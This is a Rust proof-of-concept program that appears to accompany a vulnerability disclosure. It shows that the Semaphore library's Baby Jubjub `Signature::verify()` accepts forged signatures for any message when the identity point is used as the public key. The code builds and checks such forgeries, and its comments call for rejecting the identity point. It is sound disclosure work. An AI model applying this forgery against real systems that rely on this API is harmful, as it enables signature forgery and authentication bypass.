//! Demonstration of an invalid-public-key forgery against the public
//! `identity.rs` API.
//!
//! Why this matters:
//! - Baby Jubjub has cofactor 8.
//! - `Signature::verify()` checks that the public key and `R` are on-curve.
//! - It does not reject the identity point as a public key.
//! - During verification, the challenge is multiplied by the cofactor:
//!   `s * B = R + 8 * c * A`.
//! - If `A = O` (the identity point), the public-key term disappears and the
//!   equation collapses to `s * B = R`, independently of the message.
//!
//! An attacker can therefore forge signatures for arbitrary messages by:
//! 1. choosing the identity point as the public key,
//! 2. choosing any scalar `s`,
//! 3. setting `R = s * B`.
//!
//! Important scope note:
//! This does **not** show a break of the main Semaphore proof flow. The main
//! protocol path derives identities from subgroup scalars and uses commitments,
//! not arbitrary externally supplied Baby Jubjub public keys. This PoC targets
//! the signature API exposed in `src/identity.rs`.

use ark_ec::{CurveConfig, CurveGroup, twisted_edwards::TECurveConfig};
use ark_ed_on_bn254::Fr;
use ark_ff::PrimeField;
use semaphore::{
    baby_jubjub::{BabyJubjubConfig, EdwardsAffine},
    identity::{PublicKey, Signature},
};
use std::ops::Mul;

fn identity_point() -> EdwardsAffine {
    EdwardsAffine::zero()
}

/// Forge a signature for any message under the identity public key.
///
/// The forged signature is:
/// - `s`: any scalar,
/// - `R = s * B`, where `B` is the subgroup generator used by the library.
///
/// Because verification multiplies the challenge by the cofactor, the public-key
/// term disappears when `A = O`, and the verifier only checks `s * B = R`.
fn forge_signature_for_identity_public_key(s: Fr) -> Signature {
    let r = BabyJubjubConfig::GENERATOR.mul(s).into_affine();
    Signature::new(r, s)
}

fn main() {
    let identity = identity_point();
    let messages: [&[u8]; 3] = [b"message one", b"completely different message", b"42"];

    assert!(identity.is_on_curve(), "identity point must be on curve");

    let public_key = PublicKey::from_point(identity);
    let forged = forge_signature_for_identity_public_key(Fr::from(42u64));

    for message in &messages {
        forged.verify(&public_key, message).unwrap_or_else(|err| {
            panic!(
                "forgery unexpectedly failed for identity public key and message {message:?}: {err}"
            )
        });
    }

    println!("Reproducing an invalid-public-key forgery against Signature::verify()");
    println!("Cofactor = {}", BabyJubjubConfig::COFACTOR[0]);
    println!("Subgroup order l = {}", Fr::MODULUS);
    println!();
    println!(
        "Identity public key accepted for {} distinct message(s)",
        messages.len()
    );
    println!("  public key = {}", public_key.point());
    println!("  forged R   = {}", forged.r);
    println!("  forged s   = {}", forged.s);
    println!();
    println!("Result:");
    println!("  Signature verification accepts forged signatures when the public key");
    println!("  is the identity point and only on-curve validation is enforced.");
    println!("  A proper fix requires rejecting the identity as a valid public key");
    println!("  and hardening validation for externally supplied points.");
}
